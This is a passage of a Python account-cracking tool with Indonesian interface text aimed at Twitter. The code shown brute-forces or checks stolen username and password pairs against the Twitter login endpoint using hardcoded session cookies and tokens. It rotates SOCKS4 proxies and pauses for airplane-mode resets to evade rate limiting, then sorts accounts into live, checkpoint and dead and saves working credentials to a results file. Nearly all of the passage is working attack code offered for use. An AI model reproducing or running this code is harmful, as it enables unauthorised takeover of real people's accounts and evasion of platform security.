                        print(f"{M}[{M}!{M}]{M} Join Date: {bergabung}\n")
                        self.die.append(f'{uid}|{pw}')
                        with open('Results/Cp.txt', 'a') as save:
                            save.write(f'{uid}|{pw}\n')
                        break
                    elif 'href="https://twitter.com/login/check' in str(req.text):
                        print(
                            f"{H}[{H}!{H}]{H} Use Airplane Mode 5 Seconds...",
                            end='\r')
                        time.sleep(10)
                        self.__slow__(total, uid, pwx)
                    else:
                        continue
            self.looping += 1
            print(
                f"{H}[{P}Crack{H}]{P} {self.looping}/{str(len(total))} Cp-:-{len(self.die)} Ok-:-{len(self.live)}        ",
                end='\r')
        except Exception as e:
            time.sleep(5)
            self.__fast__(total, uid, pwx)
# Check Hasil Chekpoint


class __check__:

    def __init__(self):
        self.total = 0
        self.live = []
        self.die = []
        try:
            print(f"{H}[{P}*{H}]{P} Contoh :{K} Results/Cp.txt")
            self.file = input(f"{H}[{P}?{H}]{P} File :{K} ")
            print(f"{P} ")
            if len(self.file) == 0:
                exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
            else:
                self.buka = open(self.file, 'r').read().splitlines()
                file = self.buka
                for z in file:
                    username, password = z.split('|')
                    self.__main__(file, username, password)
                exit(f"\n{H}[{P}Selesai{H}]{P}")
        except Exception as e:
            exit(f"{P}[{M}!{P}]{M} {e}")

    def __main__(self, total, username, password):
        try:
            print(
                f"{H}[{H}JAMES{H}]{H} {str(len(total))}/{self.total} Ok:-{len(self.live)} Cp:-{len(self.die)}          ",
                end='\r')
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Length': '901',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
                'Host': 'twitter.com',
                'Origin': 'https://twitter.com',
                'Referer': 'https://twitter.com/login?lang=ar',
                'TE': 'Trailers',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': useragent
            }
            data = {
                'redirect_after_login': '/',
                'remember_me': '1',
                'authenticity_token': '10908ac0975311eb868c135992f7d397',
                'wfa': '1',
                'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
                'session[username_or_email]': username,
                'session[password]': password
            }
            proxies = {
                'http': 'socks4:%s' % (random.choice(
                    open(
                        "Data/proxies.txt",
                        "r").read().splitlines()))}
            with requests.Session() as r:
                req = r.post(
                    'https://twitter.com/sessions',
                    data=data,
                    headers=headers,
                    proxies=proxies,
                    allow_redirects=False)
                if 'href="https://twitter.com/"' in str(req.text):
                    self.total += 1
                    print(f"{H}[{H}OK{H}]{H} {username}|{password}       ")
                    self.live.append(f'{username}|{password}')
                elif 'login_challenge?' in str(req.text):
                    self.total += 1
                    print(f"{M}[{M}CP{M}]{M} {username}|{password}       ")
                    self.die.append(f'{username}|{password}')
                elif 'href="https://twitter.com/login/check"' in str(req.text):
                    print(
                        f"{H}[{H}!{H}]{H} Use Airplane Mode 5 Seconds...",
                        end='\r')
                    time.sleep(5)
                    self.__main__(total, username, password)
                else:
                    self.total += 1
                    print(f"{U}[{U}Die{U}]{U} {username}|{password}     ")
        except (ConnectionError):
            print(
                f"{P}[{K}!{P}]{K} Comnection Error                ",
                end='\r')
            time.sleep(7)
            self.__main__(total, username, password)
        except Exception as e:
            exit(f"{P}[{M}!{P}]{M} {e}")





if __name__ == '__main__':
      __scap__()
# if __name__=='__main__':
#    __scap__()
